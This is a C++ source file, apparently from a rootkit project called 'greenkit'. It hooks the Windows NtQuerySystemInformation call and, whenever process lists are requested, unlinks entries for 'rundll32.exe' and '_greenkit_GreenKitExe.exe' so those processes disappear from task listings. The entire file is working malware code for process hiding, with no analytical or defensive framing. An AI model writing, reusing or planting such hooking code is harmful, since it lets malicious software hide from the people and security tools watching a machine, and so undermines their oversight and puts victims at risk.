#include "stdafx.h"

#include "NtQuerySystemInformation.h"
#include "hooking.h"

const wchar_t* m_ProcessToHide = L"rundll32.exe";
const wchar_t* m_ProcessToHide2 = L"_greenkit_GreenKitExe.exe";

TD_NtQuerySystemInformation hookNtQuery;

TD_NtQuerySystemInformation GetNtQuery()
{
    return hookNtQuery;
}

VOID SetNtQuery(TD_NtQuerySystemInformation p_HookNtQuery)
{
    hookNtQuery = p_HookNtQuery;
}

NTSTATUS WINAPI NewNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID                    SystemInformation,
    __in       ULONG                    SystemInformationLength,
    __out_opt  PULONG                   ReturnLength
    )
{
    NTSTATUS status = hookNtQuery(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);
    
    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        //
        // Loop through the list of processes
        //

        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

            if (!wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide, pNext->ImageName.Length)
                || !wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide2, pNext->ImageName.Length))
            {
                if (0 == pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }

                pNext = pCurrent;
            }
        } while (pCurrent->NextEntryOffset != 0);
    }
    return status;
}
